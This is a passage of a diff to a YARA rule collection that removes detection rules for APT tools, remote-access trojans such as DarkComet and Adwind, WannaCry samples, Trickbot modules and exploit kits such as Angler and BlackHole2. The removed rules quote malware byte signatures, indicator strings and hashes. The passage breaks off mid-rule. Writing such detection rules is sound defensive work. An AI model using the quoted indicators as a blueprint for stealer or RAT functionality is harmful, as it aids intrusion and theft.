@@ -20,41 +20,6 @@ rule libavcodec_ff_dirac_schro_video_format_info__16_big_136_ {
     $a0
 }
 
-rule EXIM_CVE_2019_10149 {
-  meta:
-    description  = "Yara Rule EXIM UPX and de-UPX"
-    author       = "Cybaze - Yoroi ZLab"
-    last_updated = "2019-06-19"
-    tlp          = "white"
-    category     = "informational"
-
-  strings:
-    $s1  = "ELF"
-    $s2  = "Buildroot 2014.02"
-    $s3  = "445403338652341"
-    $s4  = { 96 0E 14 41 C3 0E 10 44 C6 }
-    $s5  = { 5C 24 0C 01 E9 8A 0C 01 32 4C }
-    $s6  = "OpenSSL 1.0.1f 6 Jan 2014"
-    $s7  = { 0E 14 41 C3 0E 10 }
-    $s8  = { 5E CC 14 D8 E1 48 BF 7E 6D }
-    $s9  = { FF 83 A7 24 01 00 00 FD }
-    $s10 = "UWVSQ"
-    $s11 = { C1 0A CF 0A D9 0A E5 }
-    $a12 = "UPX"
-    $a13 = { 22 00 1A 03 00 2A A2 }
-    $a14 = { 55 06 3C 3C BA 4D E9 C6 }
-    $a15 = { 0B 58 A6 9E 88 BD 51 C1 22 }
-    $a16 = "g*!W#;)"
-    $a17 = { F5 6F D7 CD 6D 28 1F 49 }
-    $a18 = { 66 FA A4 B5 78 F0 24 C3 }
-    $a19 = { 8E 82 07 8D 05 53 80 29 }
-    $a20 = { 9B 1C B7 E4 57 93 35 8F 7A }
-    $a21 = { 47 8F 7E 4D 0B 24 8C 7D }
-
-  condition:
-    $s1 and 4 of ($s*) or $s1 and 5 of ($a*)
-}
-
 rule Stealer {
   strings:
     $a = "dump-generic-passwords"
@@ -900,19 +865,6 @@ rule Check_Qemu_Description {
     all of them
 }
 
-rule Check_Wine {
-  meta:
-    Author      = "Nick Hoffman"
-    Description = "Checks for the existence of Wine"
-    Sample      = "de1af0e97e94859d372be7fcf3a5daa5"
-
-  strings:
-    $ = "wine_get_unix_file_name"
-
-  condition:
-    any of them
-}
-
 rule antivm_bios {
   meta:
     author      = "x0r"
@@ -943,19 +895,6 @@ rule BISCUIT_GREENCAT_APT1 {
     $s4 = "----client system info----" wide ascii
     $s5 = "stfile" wide ascii
     $s6 = "cmd success!" wide ascii
-
-  condition:
-    all of them
-}
-
-rule BOUNCER_DLL_APT1 {
-  meta:
-    author = "AlienVault Labs"
-    info   = "CommentCrew-threat-apt1"
-
-  strings:
-    $s1 = "new_connection_to_bounce():" wide ascii
-    $s2 = "usage:%s IP port [proxip] [port] [key]" wide ascii
 
   condition:
     all of them
@@ -1124,21 +1063,6 @@ rule EclipseSunCloudRAT {
     $d = "XiaoME" wide ascii
     $e = "SunCloud-Code" wide ascii
     $f = "/uc_server/data/forum.asp" wide ascii
-
-  condition:
-    any of them
-}
-
-rule MoonProject {
-  meta:
-    author = "AlienVault Labs"
-    info   = "CommentCrew-threat-apt1"
-
-  strings:
-    $a = "Serverfile is smaller than Clientfile" wide ascii
-    $b = "\\M tools\\" wide ascii
-    $c = "MoonDLL" wide ascii
-    $d = "\\M tools\\" wide ascii
 
   condition:
     any of them
@@ -1394,23 +1318,6 @@ rule FE_APT_9002 {
     ($mz at 0) and $a
 }
 
-rule Careto_SGH {
-  meta:
-    author      = "AlienVault (Alberto Ortega)"
-    description = "TheMask / Careto SGH component signature"
-    reference   = "www.securelist.com/en/downloads/vlpdfs/unveilingthemask_v1.0.pdf"
-    date        = "2014/02/11"
-
-  strings:
-    $m1 = "PGPsdkDriver" ascii wide fullword
-    $m2 = "jpeg1x32" ascii wide fullword
-    $m3 = "SkypeIE6Plugin" ascii wide fullword
-    $m4 = "CDllUninstall" ascii wide fullword
-
-  condition:
-    2 of them
-}
-
 rule Careto_CnC {
   meta:
     author      = "AlienVault (Alberto Ortega)"
@@ -1640,23 +1547,6 @@ rule EquationGroup__funnelout_v4_1_0_1 {
 
   condition:
     (uint16(0) == 0x2123 and filesize < 100KB and 2 of them) or (all of them)
-}
-
-rule EquationGroup_Toolset_Apr17_FullThreadDump {
-  meta:
-    description = "Detects EquationGroup Tool - April Leak"
-    author      = "Florian Roth"
-    reference   = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
-    date        = "2017-04-15"
-    hash1       = "b68f3f32bfa6cf11145c9fb9bf0075a5ca3938ea218b1cc29ad62f7b9e043255"
-
-  strings:
-    $s1 = "FullThreadDump.class" fullword ascii
-    $s2 = "ThreadMonitor.class" fullword ascii
-    $s3 = "Deadlock$DeadlockThread.class" fullword ascii
-
-  condition:
-    (uint16(0) == 0x4b50 and filesize < 30KB and all of them)
 }
 
 rule apt_equation_doublefantasy_genericresource {
@@ -2096,20 +1986,6 @@ rule OPCLEAVER_SynFlooder {
 
   condition:
     all of them
-}
-
-rule MiSType_Backdoor_Packed {
-  meta:
-    author = "Cylance SPEAR Team"
-    note   = "Probably Prone to False Positive"
-
-  strings:
-    $upx            = { 33 2E 30 33 00 55 50 58 21 }
-    $send_httpquery = { 00 00 00 48 74 74 70 51 75 65 72 79 49 6E 66 6F 41 00 00 73 65 6E 64 00 00 }
-    $delphi_sec_pe  = { 50 45 00 00 4C 01 03 00 19 5E 42 2A }
-
-  condition:
-    filesize < 100KB and $upx and $send_httpquery and $delphi_sec_pe
 }
 
 rule Misdat_Backdoor {
@@ -3019,21 +2895,6 @@ rule lost_door: Trojan {
     $signature1
 }
 
-rule LuckyCatCode: LuckyCat Family {
-  meta:
-    description   = "LuckyCat code tricks"
-    author        = "Seth Hardy"
-    last_modified = "2014-06-19"
-
-  strings:
-    $xordecrypt    = { BF 0F 00 00 00 F7 F7 ?? ?? ?? ?? 32 14 39 80 F2 7B }
-    $dll           = { C6 ?? ?? ?? 64 C6 ?? ?? ?? 6C C6 ?? ?? ?? 6C }
-    $commonletters = { B? 63 B? 61 B? 73 B? 65 }
-
-  condition:
-    $xordecrypt or ($dll and $commonletters)
-}
-
 rule LURK0Header: Family LURK0 {
   meta:
     description  = "5 char code for LURK0"
@@ -3646,22 +3507,6 @@ rule nAspyUpdateStrings: nAspyUpdate Family {
     any of them
 }
 
-rule NSFreeStrings: NSFree Family {
-  meta:
-    description   = "NSFree Identifying Strings"
-    author        = "Seth Hardy"
-    last_modified = "2014-06-24"
-
-  strings:
-    $ = "\\MicNS\\" nocase
-    $ = "NSFreeDll" wide ascii
-    // xor 0x58 dos stub
-    $ = { 0c 30 31 2b 78 28 2a 37 3f 2a 39 35 78 3b 39 36 36 37 }
-
-  condition:
-    any of them
-}
-
 rule Trj_Ponmocup {
   meta:
     author      = "Centro Criptológico Nacional (CCN)"
@@ -3675,21 +3520,6 @@ rule Trj_Ponmocup {
 
   condition:
     ($mz at 0) and ($pac at 0x61F7C) and ($unp at 0x29F0)
-}
-
-rule Trj_Ponmocup_dll {
-  meta:
-    author      = "Centro Criptológico Nacional (CCN)"
-    ref         = "https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html"
-    description = "Ponmocup Bot DLL"
-
-  strings:
-    $mz  = "MZ"
-    $pck = { 00 81 23 00 33 3E 00 00 3B F4 56 00 00 00 7D 00 }
-    $upk = { 68 F4 14 00 10 A1 6C C0 02 10 FF D0 59 59 E9 7A }
-
-  condition:
-    ($mz at 0) and ($pck at 0x8a50) and ($upk at 0x61f)
 }
 
 rule PubSabCode: PubSab Family {
@@ -4003,21 +3833,6 @@ rule MALW_systeminfo_trickbot_module: Trojan {
 
   condition:
     all of ($str_systeminf_*)
-}
-
-rule MALW_dllinject_trickbot_module: Trojan {
-  meta:
-    author      = "Marc Salinas @Bondey_m"
-    description = " Detects dllinject module from Trickbot Trojan"
-
-  strings:
-    $str_dllinj_01 = "user_pref("
-    $str_dllinj_02 = "<ignore_mask>"
-    $str_dllinj_03 = "<require_header>"
-    $str_dllinj_04 = "</dinj>"
-
-  condition:
-    all of ($str_dllinj_*)
 }
 
 rule MALW_mailsercher_trickbot_module: Trojan {
@@ -4429,54 +4244,6 @@ rule Locky_Ransomware_2: ransom {
     all of them
 }
 
-rule Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549: Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549 {
-  meta:
-    description = "Specific sample match for WannaCryptor"
-    MD5         = "84c82835a5d21bbcf75a61706d8ab549"
-    SHA1        = "5ff465afaabcbf0150d1a3ab2c2e74f3a4426467"
-    SHA256      = "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
-    INFO        = "Looks for 'taskdl' and 'taskse' at known offsets"
-
-  strings:
-    $taskdl = { 00 74 61 73 6b 64 6c }
-    $taskse = { 00 74 61 73 6b 73 65 }
-
-  condition:
-    $taskdl at 3419456 and $taskse at 3422953
-}
-
-rule Wanna_Sample_4da1f312a214c07143abeeafb695d904: Wanna_Sample_4da1f312a214c07143abeeafb695d904 {
-  meta:
-    description = "Specific sample match for WannaCryptor"
-    MD5         = "4da1f312a214c07143abeeafb695d904"
-    SHA1        = "b629f072c9241fd2451f1cbca2290197e72a8f5e"
-    SHA256      = "aee20f9188a5c3954623583c6b0e6623ec90d5cd3fdec4e1001646e27664002c"
-    INFO        = "Looks for offsets of r.wry and s.wry instances"
-
-  strings:
-    $rwnry = "r.wry"
-    $swnry = "s.wry"
-
-  condition:
-    $rwnry at 88195 and $swnry at 88656 and $rwnry at 4495639
-}
-
-rule NHS_Strain_Wanna: NHS_Strain_Wanna {
-  meta:
-    description = "Detection for worm-strain bundle of Wcry, DOublePulsar"
-    MD5         = "db349b97c37d22f5ea1d1841e3c89eb4"
-    SHA1        = "e889544aff85ffaf8b0d0da705105dee7c97fe26"
-    SHA256      = "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c"
-    INFO        = "Looks for specific offsets of c.wnry and t.wnry strings"
-
-  strings:
-    $cwnry = "c.wnry"
-    $twnry = "t.wnry"
-
-  condition:
-    $cwnry at 262324 and $twnry at 267672 and $cwnry at 284970
-}
-
 rule Ransom_Petya {
   meta:
     description = "Regla para detectar Ransom.Petya con md5 AF2379CC4D607A45AC44D62135FB7015"
@@ -4538,39 +4305,6 @@ rule TeslaCrypt {
     all of them
 }
 
-rule Adwind_JAR_PACKA: binary RAT Frutas Unrecom AlienSpy {
-  meta:
-    author        = "Vitaly Kamluk, Vitaly.Kamluk@kaspersky.com"
-    reference     = "https://securelist.com/securelist/files/2016/02/KL_AdwindPublicReport_2016.pdf"
-    last_modified = "2015-11-30"
-
-  strings:
-    $b1 = ".class" ascii
-    $b2 = "c/a/a/" ascii
-    $b3 = "b/a/" ascii
-    $b4 = "a.dat" ascii
-    $b5 = "META-INF/MANIFEST.MF" ascii
-
-  condition:
-    int16(0) == 0x4B50 and ($b1 and $b2 and $b3 and $b4 and $b5)
-}
-
-rule Adwind_JAR_PACKB: binary RAT Frutas Unrecom AlienSpy {
-  meta:
-    author        = "Vitaly Kamluk, Vitaly.Kamluk@kaspersky.com"
-    reference     = "https://securelist.com/securelist/files/2016/02/KL_AdwindPublicReport_2016.pdf"
-    last_modified = "2015-11-30"
-
-  strings:
-    $c1 = "META-INF/MANIFEST.MF" ascii
-    $c2 = "main/Start.class" ascii
-    $a1 = "con g/con g.perl" ascii
-    $b1 = "java/textito.isn" ascii
-
-  condition:
-    int16(0) == 0x4B50 and ($c1 and $c2 and ($a1 or $b1))
-}
-
 rule BlackShades2: Trojan RAT {
   meta:
     author      = "Kevin Falcoz"
@@ -4604,75 +4338,6 @@ rule BlackShades_4: rat {
 
   condition:
     any of ($a, $b, $c, $d, $e) or $apikey
-}
-
-rule DarkComet_2: rat {
-  meta:
-    description = "DarkComet"
-    author      = "Jean-Philippe Teissier / @Jipe_"
-    date        = "2013-01-12"
-    filetype    = "memory"
-    version     = "1.0"
-
-  strings:
-    $a  = "#BEGIN DARKCOMET DATA --"
-    $b  = "#EOF DARKCOMET DATA --"
-    $c  = "DC_MUTEX-"
-    $k1 = "#KCMDDC5#-890"
-    $k2 = "#KCMDDC51#-890"
-
-  condition:
-    any of them
-}
-
-rule DarkComet_Keylogger_File: RAT {
-  meta:
-    author      = "Florian Roth"
-    description = "Looks like a keylogger file created by DarkComet Malware"
-    date        = "25.07.14"
-    reference   = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
-    score       = 50
-
-  strings:
-    $magic     = "::"
-    $entry     = /\n:: [A-Z]/
-    $timestamp = /\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\)/
-
-  condition:
-    ($magic at 0) and #entry > 10 and #timestamp > 10
-}
-
-rule DarkComet_4: RAT {
-  meta:
-    reference = "https://github.com/bwall/bamfdetect/blob/master/BAMF_Detect/modules/yara/darkcomet.yara"
-
-  strings:
-    $a1 = "#BOT#"
-    $a2 = "WEBCAMSTOP"
-    $a3 = "UnActiveOnlineKeyStrokes"
-    $a4 = "#SendTaskMgr"
-    $a5 = "#RemoteScreenSize"
-    $a6 = "ping 127.0.0.1 -n 4 > NUL &&"
-
-  condition:
-    all of them
-}
-
-rule MW_gholee_v1: v1 {
-  meta:
-    Author          = "@GelosSnake"
-    description     = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html"
-    date            = "2014-08"
-    maltype         = "Remote Access Trojan"
-    sample_filetype = "dll"
-    hash0           = "48573a150562c57742230583456b4c02"
-
-  strings:
-    $a = "sandbox_avg10_vc9_SP1_2011"
-    $b = "gholee"
-
-  condition:
-    all of them
 }
 
 rule Havex_Trojan_PHP_Server {
@@ -5035,19 +4700,6 @@ rule Unknown_Random {
 
   strings:
     $c0 = { 55 8B EC 52 8B 45 08 69 15 ?? ?? ?? ?? 05 84 08 08 42 89 15 ?? ?? ?? ?? F7 E2 8B C2 5A C9 C2 04 00 }
-
-  condition:
-    $c0
-}
-
-rule VC6_Random {
-  meta:
-    author      = "_pusher_"
-    description = "Look for Random function"
-    date        = "2016-02"
-
-  strings:
-    $c0 = { A1 ?? ?? ?? ?? 69 C0 FD 43 03 00 05 C3 9E 26 00 A3 ?? ?? ?? ?? C1 F8 10 25 FF 7F 00 00 C3 }
 
   condition:
     $c0
@@ -5568,30 +5220,6 @@ rule XYPayload: Payload {
 
   condition:
     $start_marker and $end_marker
-}
-
-rule PlugXBootLDRCode: PlugX Family {
-  meta:
-    description   = "PlugX boot.ldr code tricks"
-    author        = "Seth Hardy"
-    last_modified = "2014-06-12"
-
-  strings:
-    //$callpop = { E8 00 00 00 00 58 }
-    // Compares [eax+n] to GetProcAdd, one character at a time. This goes up to GetP:
-    $GetProcAdd             = { 80 38 47 75 36 80 78 01 65 75 30 80 78 02 74 75 2A 80 78 03 50 }
-    // Load these function strings 4 characters at a time. These check the first two blocks:
-    $L4_LoadLibraryA        = { C7 (?? ?? | ?? ?? ?? ?? ??) 4C 6F 61 64 C7 (?? ?? | ?? ?? ?? ?? ??) 4C 69 62 72 }
-    $L4_VirtualAlloc        = { C7 (?? ?? | ?? ?? ?? ?? ??) 56 69 72 74 C7 (?? ?? | ?? ?? ?? ?? ??) 75 61 6C 41 }
-    $L4_VirtualFree         = { C7 (?? ?? | ?? ?? ?? ?? ??) 56 69 72 74 C7 (?? ?? | ?? ?? ?? ?? ??) 75 61 6C 46 }
-    $L4_ExitThread          = { C7 (?? ?? | ?? ?? ?? ?? ??) 45 78 69 74 C7 (?? ?? | ?? ?? ?? ?? ??) 54 68 72 65 }
-    $L4_ntdll               = { C7 (?? ?? | ?? ?? ?? ?? ??) 6E 74 64 6C 66 C7 (?? ?? | ?? ?? ?? ?? ??) C6 00 }
-    $L4_RtlDecompressBuffer = { C7 (?? ?? | ?? ?? ?? ?? ??) 52 74 6C 44 C7 (?? ?? | ?? ?? ?? ?? ??) 65 63 6F 6D }
-    $L4_memcpy              = { C7 (?? ?? | ?? ?? ?? ?? ??) 6D 65 6D 63 66 C7 (?? ?? | ?? ?? ?? ?? ??) 70 79 }
-
-  condition:
-    /*($callpop at 0) or */
-    $GetProcAdd or (all of ($L4_*))
 }
 
 rule TEA_encryption_decryption__0xc6ef3720__0x61c88647___32_big_AND_ {
@@ -8626,448 +8254,6 @@ rule AnglerEKredirector {
     all of them
 }
 
-rule angler_html {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Angler Exploit Kit Detection"
-    hash0           = "afca949ab09c5583a2ea5b2006236666"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = " A9 3E AF D5 9AQ FA 14 BC F2 A0H EA 7FfJ A58 A3 B1 BD 85 DB F3 B4 B6 FB B2 B4 14 82 19 88 28 D0 EA 2"
-    $string1  = " 2BS 25 26p 20 3F 81 0E D3 9C 84 C7 EC C3 C41M C48 D3 B5N 09 C2z 98 7B 09. DF 05 5EQ DF A3 B6 EE D5 "
-    $string2  = "9 A1Fg A8 837 9A A9 0A 1D 40b02 A5U6 22o 16 DC 5D F5 F5 FA BE FB EDX F0 87 DB C9 7B D6 AC F6D 10 1AJ"
-    $string3  = "24 AA 17 FB B0 96d DBN 05 EE F6 0F 24 D4 D0 C0 E4 96 03 A3 03 20/ 04 40 DB 8F 7FI A6 DC F5 09 0FWV 1"
-    $string4  = "Fq B3 94 E3 3E EFw E6 AA9 3A 5B 9E2 D2 EC AF6 10c 83 0F DF BB FBx AF B4 1BV 5C DD F8 9BR 97v D0U 9EG"
-    $string5  = "29 9B 01E C85 86 B0 09 EC E07 AFCY 19 E5 11 1C 92 E2 DA A9 5D 19P 3A BF AB D6 B3 3FZ B4 92 FF E1 27 "
-    $string6  = "B A9 88 B8 F0 EBLd 8E 08 18 11P EE BFk 15 5BM D6 B7 CEh AF 9C 8F 04 89 88 5E F6 ED 13 8EN1p 86Vk BC "
-    $string7  = "w F4 C8 16pV 22 0A BB EB 83 7D BC 89 B6 E06 8B 2A DC E6 7D CE. 0Dh 18 0A8 5E 60 0C BF A4 00M 00 E3 3"
-    $string8  = "B7 C6 E3 8E DC 3BR 60L 94h D8 AA7k5s 0D 7Fb 8B 80P E0 1BP EBT B5 03zE D0o 2A B97 18 F39 7C 94 99 11 "
-    $string9  = "kY 24 8E 3E 94 84 D2 00 1EB 16 A4 9C 28 24 C1B BB 22 7D 97c F5 BA AD C4 5C 23 5D 3D 5C A7d5 0C F6 EA"
-    $string10 = "08 01 3A 15 3B E0 1A E2 89 5B A2 F4 ED 87O F9l A99 124 27 BF BB A1c 2BW 12Z 07 AA D9 81 B7 A6-5 E2 E"
-    $string11 = " 16 BF A7 0E 00 16 BB 8FB CBn FC D8 9C C7 EA AC C2q 85n A96I D1 9B FC8 BDl B8 3Ajf 7B ADH FD 20 88 F"
-    $string12 = "  ML    "
-    $string13 = " AEJ 3B C7 BFy EF F07X D3 A0 1E B4q C4 BE 3A 10 E7 A0 FE D1Jhp 89 A0sj 1CW 08 D5 F7 C8 C6 D5I 81 D2 "
-    $string14 = "B 24 90 ED CEP C8 C9 9B E5 25 09 C6B- 2B 3B C7 28 C9 C62 EB D3 D5 ED DE A8 7F A9mNs 87 12 82 03 A2 8"
-    $string15 = "A 3A A2L DFa 18 11P 00 7F1 BBbY FA 5E 04 C4 5D 89 F3S DAN B5 CAi 8D 0A AC A8 0A ABI E6 1E 89 BB 07 D"
-    $string16 = "C B5 FD 0B F9 0Ch CE 01 14 8Dp AF 24 E0 E3 D90 DD FF B0 07 2Ad 0B 7D B0 B2 D8 BD E6 A7 CE E1 E4 3E5 "
-    $string17 = "19 0C 85 14r/ 8C F3 84 2B 8C CF 90 93 E2 F6zo C3 D40 A6 94 01 02Q 21G AB B9 CDx 9D FB 21 2C 10 C3 3C"
-    $string18 = "FAV D7y A0 C7Ld4 01 22 EE B0 1EY FAB BA E0 01 24 15g C5 DA6 19 EEsl BF C7O 9F 8B E8 AF 93 F52 00 06 "
-
-  condition:
-    18 of them
-}
-
-rule angler_html2 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Angler Exploit Kit Detection"
-    hash0           = "6c926bf25d1a8a80ab988c8a34c0102e"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "E 06 E7i 1E 91q 9C D0J 1D 9B 14 E7g 1D DD ECK 20c 40 C6 0C AFR5 3D 03 9Em EC 0CB C9 A9 DFw C9 ADP 5B"
-    $string1  = "14Bc 5C 3Bp CB 2A 12 3D A56 AA 14 87 E3 81 8A 80h 27 1C 3A4 CE 12 AE FAy F0 8A 21 B8I AD 1E B9 2C D1"
-    $string2  = "0J 95 83 CC 1C 95D CAD 1A EA F3 00 E9 DA_ F2 ED 3CM1 A0 01t 1B EE 2C B6AWKq BF CAY FE D8 F2 7C 96 92"
-    $string3  = "A8MTCsn C9 DBu D3 10 A0 D4 AC A9 97 06Rn 01 DAK EFFN ADP AE 0E 8FJd 8F DA B6 25RO 18 2A 00 EA F9 8B "
-    $string4  = "A3 EB C1 CE 1E C4ok C4 19 F2 A7 17 9FCoz B6- C6 25J BB 0B 8C1OZ E4 7B AEz F6 06A 5D C0 D7 E8 FF DB D"
-    $string5  = " 07 DE A3 F8 B0 B3 20V A4 B2 C8 60 BD EEG 95 BB 04 1Ckw A4 80 E6 23 F02 FA 9C 9A 14F BDC 18 BE BD B4"
-    $string6  = "7 D1 B9 9B AC 2AN BA D3 00 A9 1CJ3J C0V 8F 8E FC B6p9 00 E1 01 21j B3 27 FF C3 8E 2B 92 8B DEiUI C3 "
-    $string7  = " 99 2C AF9 F9 3F5 A8 F0 1BU C8e/ 00Q B4 10 DD BC 9D 8A BF B2 17 8F BFd DB D1 B7 E66 21 96 86 1E B2 1"
-    $string8  = "E86 DF9 22Tg E93 9Em 29 0A 5B B5m E2 DCIF D6 D2 F5B CF F7XkRv BE EA A6 C5 82p 5E B3 B4aD B9 3A E0 22"
-    $string9  = " 7C 95.q D6f E8 1AE 17 82T 84 F1/O 82 C2q C7 FE 05C E4 E5W F5 0A E4l 12 3Brt 8A E0 E7 DDJ 1F 1F C4 A"
-    $string10 = "4t 91iE BD 2C 95U E9 1C AE 5B 5B A3 9D B2 F9 0B B5 15S9 AB 9D 94 85 A6 F1 AF B6 FC CAt 91iE BD 2C 95"
-    $string11 = "  </input>"
-    $string12 = "2 D12 93 FD AB 0DKK AEN 40 DA 88 7B FA 3B 18 EE 09 92 ED AF A8b 07 002 0A A3S 04 29 F9 A3 EA BB E9 7"
-    $string13 = "40 C6 0C AFR5E 15 07 EE CBg B3 C6 60G 92tFt D7E 7D F0 C4 A89 29 EC BA E1 D9 3D 23 F0 0B E0o 3E2c B3 "
-    $string14 = "2 A3. A3 F1 D8 D4 A83K 9C AEu FF EA 02 F4 B8 A0 EE C9 7B 15 C1 07D 80 7C 10 864 96 E3 AA F8 99bgve D"
-    $string15 = "C 7D DC 0A E9 0D A1k 85s 9D 24 8C D0k E1 7E 3AH E2 052 D8q 16 FC 96 0AR C0 EC 99K4 3F BE ED CC DBE A"
-    $string16 = "40 DA 88 7B 9E 1A B3 FA DE 90U 5B BD6x 9A 0C 163 AB EA ED B4 B5 98 ADL B7 06 EE E5y B8 9B C9Q 00 E9 "
-    $string17 = "F BF_ F9 AC 5B CC 0B1 7B 60 20c 40 C6 0C AFR5 0B C7D 09 9D E30 14 AC 027 B2 B9B A7 06 E3z DC- B2 60 "
-    $string18 = "0 80 97Oi 8C 85 D2 1Bp CDv 11 05 D4 26 E7 FC 3DlO AE 96 D2 1B 89 7C 16H 11 86 D0 A6 B95 FC 01 C5 8E "
-
-  condition:
-    18 of them
-}
-
-rule blackhole2_css {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "BlackHole2 Exploit Kit Detection"
-    hash0           = "9664a16c65782d56f02789e7d52359cd"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string1 = "background:url('%%?a=img&img=countries.gif')"
-    $string2 = "background:url('%%?a=img&img=exploit.gif')"
-    $string3 = "background:url('%%?a=img&img=oses.gif')"
-    $string4 = "background:url('%%?a=img&img=browsers.gif')"
-    $string5 = "background:url('%%?a=img&img=edit.png')"
-    $string6 = "background:url('%%?a=img&img=add.png')"
-    $string7 = "background:url('%%?a=img&img=accept.png')"
-    $string8 = "background:url('%%?a=img&img=del.png')"
-    $string9 = "background:url('%%?a=img&img=stat.gif')"
-
-  condition:
-    18 of them
-}
-
-rule blackhole2_htm11 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "BlackHole2 Exploit Kit Detection"
-    hash0           = "e89b56df597688c489f06a0a6dd9efed"
-    hash1           = "06ba331ac5ae3cd1986c82cb1098029e"
-    hash2           = "a899dedb50ad81d9dbba660747828c7b"
-    hash3           = "7cbb58412554327fe8b643204a046e2b"
-    hash2           = "a899dedb50ad81d9dbba660747828c7b"
-    hash0           = "e89b56df597688c489f06a0a6dd9efed"
-    hash2           = "a899dedb50ad81d9dbba660747828c7b"
-    hash7           = "530d31a0c45b79c1ee0c5c678e242c02"
-    hash2           = "a899dedb50ad81d9dbba660747828c7b"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "></th><th><a href"
-    $string1  = "/icons/back.gif"
-    $string2  = ">Description</a></th></tr><tr><th colspan"
-    $string3  = "nbsp;</td><td align"
-    $string4  = "nbsp;</td></tr>"
-    $string5  = ">  - </td><td>"
-    $string6  = "-//W3C//DTD HTML 3.2 Final//EN"
-    $string7  = "<h1>Index of /dummy</h1>"
-    $string8  = ">Size</a></th><th><a href"
-    $string9  = " </head>"
-    $string10 = "/icons/blank.gif"
-    $string11 = "><hr></th></tr>"
-
-  condition:
-    11 of them
-}
-
-rule blackhole2_htm12 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "BlackHole2 Exploit Kit Detection"
-    hash0           = "0d3acb5285cfe071e30be051d2aaf28a"
-    hash1           = "6f27377115ba5fd59f007d2cb3f50b35"
-    hash2           = "f7ffe1fd1a57d337a04d3c777cddc065"
-    hash3           = "06997228f2769859ef5e4cd8a454d650"
-    hash4           = "11062eea9b7f2a2675c1e60047e8735c"
-    hash0           = "0d3acb5285cfe071e30be051d2aaf28a"
-    hash2           = "f7ffe1fd1a57d337a04d3c777cddc065"
-    hash7           = "4ec720cfafabd1c9b1034bb82d368a30"
-    hash8           = "ecd7d11dc9bb6ee842e2a2dce56edc6f"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "  <title>Index of /data</title>"
-    $string1  = "<tr><th colspan"
-    $string2  = "</body></html>"
-    $string3  = "> 20K</td><td>"
-    $string4  = "/icons/layout.gif"
-    $string5  = " <body>"
-    $string6  = ">Name</a></th><th><a href"
-    $string7  = ">spn.jar</a></td><td align"
-    $string8  = ">spn2.jar</a></td><td align"
-    $string9  = " <head>"
-    $string10 = "-//W3C//DTD HTML 3.2 Final//EN"
-    $string11 = "> 10K</td><td>"
-    $string12 = ">7.9K</td><td>"
-    $string13 = ">Size</a></th><th><a href"
-    $string14 = "><hr></th></tr>"
-
-  condition:
-    14 of them
-}
-
-rule blackhole2_htm6 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "BlackHole2 Exploit Kit Detection"
-    hash0           = "a5f94d7bdeb88b57be67132473e48286"
-    hash1           = "2e72a317d07aa1603f8d138787a2c582"
-    hash2           = "9440d49e1ed0794c90547758ef6023f7"
-    hash3           = "58265fc893ed5a001e3a7c925441298c"
-    hash2           = "9440d49e1ed0794c90547758ef6023f7"
-    hash0           = "a5f94d7bdeb88b57be67132473e48286"
-    hash2           = "9440d49e1ed0794c90547758ef6023f7"
-    hash7           = "95c6462d0f21181c5003e2a74c8d3529"
-    hash8           = "9236e7f96207253b4684f3497bcd2b3d"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0 = "uniq1.png"
-    $string1 = "edit.png"
-    $string2 = "left.gif"
-    $string3 = "infin.png"
-    $string4 = "outdent.gif"
-    $string5 = "exploit.gif"
-    $string6 = "sem_g.png"
-    $string7 = "Index of /library/templates/img"
-    $string8 = "uniq1.png"
-
-  condition:
-    8 of them
-}
-
-rule zerox88_js2 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "0x88 Exploit Kit Detection"
-    hash0           = "cad8b652338f5e3bc93069c8aa329301"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "function gSH() {"
-    $string1  = "200 HEIGHT"
-    $string2  = "'sh.js'><\\/SCRIPT>"
-    $string3  = " 2 - 26;"
-    $string4  = "<IFRAME ID"
-    $string5  = ",100);"
-    $string6  = "200></IFRAME>"
-    $string7  = "setTimeout("
-    $string8  = "'about:blank' WIDTH"
-    $string9  = "mf.document.write("
-    $string10 = "document.write("
-    $string11 = "Kasper "
-
-  condition:
-    11 of them
-}
-
-rule eleonore_js {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-26"
-    description     = "Eleonore Exploit Kit Detection"
-    hash0           = "08f8488f1122f2388a0fd65976b9becd"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "var de"
-    $string1  = "sdjk];"
-    $string2  = "return dfshk;"
-    $string3  = "function jkshdk(){"
-    $string4  = "'val';"
-    $string5  = "var sdjk"
-    $string6  = "return fsdjkl;"
-    $string7  = " window[d"
-    $string8  = "var fsdjkl"
-    $string9  = "function jklsdjfk() {"
